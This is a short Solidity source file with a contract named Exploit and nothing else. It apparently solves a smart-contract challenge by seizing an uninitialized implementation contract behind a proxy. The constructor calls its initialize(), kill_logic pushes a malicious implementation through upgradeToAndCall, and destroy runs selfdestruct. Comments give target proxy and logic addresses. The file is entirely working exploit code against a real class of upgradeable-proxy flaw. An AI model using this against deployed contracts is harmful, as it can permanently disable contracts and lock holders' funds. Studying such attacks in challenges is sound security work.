// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

contract Exploit {
    bytes public data;
    address private engine;

    constructor(address _engine) public {
        engine = _engine;

        (bool success, bytes memory _data) = _engine.call(
            abi.encodeWithSignature("initialize()")
        );
        data = _data;
        require(success, "initialize in logic contract failed!");

    }

    function kill_logic(address _newImplementation, bytes memory _data) public {
         (bool success, bytes memory _dataOut) = engine.call(
            abi.encodeWithSignature("upgradeToAndCall(address,bytes)", _newImplementation, _data)
        );

        require(success, "upgradeToAndCall failed!");
    }

    function destroy() public {
        selfdestruct(address(0x0));
    }
}

// proxy address: 0x92f9B74b74D43259bd777A762F257f5648f0CdBC
// logic address: 0xbbce23bdf011a1064cc46d23aaae1379eaba2c05